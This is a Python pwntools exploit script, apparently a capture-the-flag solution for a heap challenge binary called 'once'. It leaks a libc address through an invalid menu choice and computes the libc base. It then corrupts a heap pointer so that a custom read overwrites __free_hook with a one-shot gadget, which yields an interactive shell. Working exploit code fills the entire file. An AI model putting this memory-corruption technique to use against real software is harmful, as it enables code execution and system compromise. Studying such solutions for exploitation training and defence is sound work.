from pwn import *

context.log_level='debug'

s=process('./once',env={'LD_PRELOAD':'./libc.so.6'})

libc=ELF('./libc.so.6')

def leak():
	s.recvuntil('>')
	s.sendline('10')
	s.recvuntil('Invalid choice')
	puts=s.recvuntil('>')[:-1]
	puts=int(puts,16)
	
	return puts

def custom_malloc():
	s.sendline('4')
	s.recvuntil('>')
	s.sendline('1')
	s.recvuntil('size:')
	s.sendline('200')
	s.recvuntil('>')
	s.sendline('4')

def custom_read(data):
	s.recvuntil('>')
        s.sendline('4')
        s.recvuntil('>')
        s.sendline('2')
	s.send(data)
	s.recvuntil('>')
	s.sendline('4')

def control():
        s.recvuntil('>')
        s.sendline('3')


def normal_malloc():
	s.recvuntil('>')
	s.sendline('1')

def normal_read(data):
        #s.recvuntil('>')
        s.sendline('2')
	s.send(data)

if __name__ == "__main__":	

	s=process('./once')

	puts=leak()
	base=puts-0x6f690
	malloc_hook=base+libc.symbols['__malloc_hook']
	free_hook=base+libc.symbols['__free_hook']

	normal_read('A'*0x18+'\x58')
	custom_malloc()

	'''
	0x55e5166af030:	0x4141414141414141	0x000055e5166af058
	x55e5166af040 <stdout>:	0x00007f83b4bb6620	0x0000000000000000
	0x55e5166af050 <stdin>:	0x00007f83b4bb58e0	0x0000000000000000
	0x55e5166af060:	0x0000000100000000	0x000055e516807010 <- custom heap address
	0x55e5166af070:	0x000000c800000000	0x0000000000000001
	'''

	normal_malloc()
	'''
	0x55dc8e6b20d0:	0x0000000000000000	0x0000000000000031
	0x55dc8e6b20e0:	0x0000000000000000	0x0000000000000000
	0x55dc8e6b20f0:	0x000055dc8e167020	0x000055dc8e167058
	'''
	control() 	

	'''
	0x556cc84c2020:	0x4141414141414141	0x4141414141414141
	0x556cc84c2030:	0x4141414141414141	0x0000556cc84c2058
	0x556cc84c2040 <stdout>:	0x00007f3ea0e44620	0x0000000000000000
	0x556cc84c2050 <stdin>:	0x00007f3ea0e438e0	0x0000000000000000
	0x556cc84c2060:	0x0000000100000001	0x0000556cc84c2020 <= Possible contorl of custom_read
	'''
	custom_read('A'*0x18+p64(free_hook)+p64(base+0x3c5620)+p64(0x0)+p64(base+0x3c48e0)+p64(0x0)*2)

	normal_read(p64(base+0xf1147)) #oneshot gadget

	print "puts: "+str(hex(puts))
	print "malloc_hook: "+str(hex(malloc_hook))

	s.interactive()
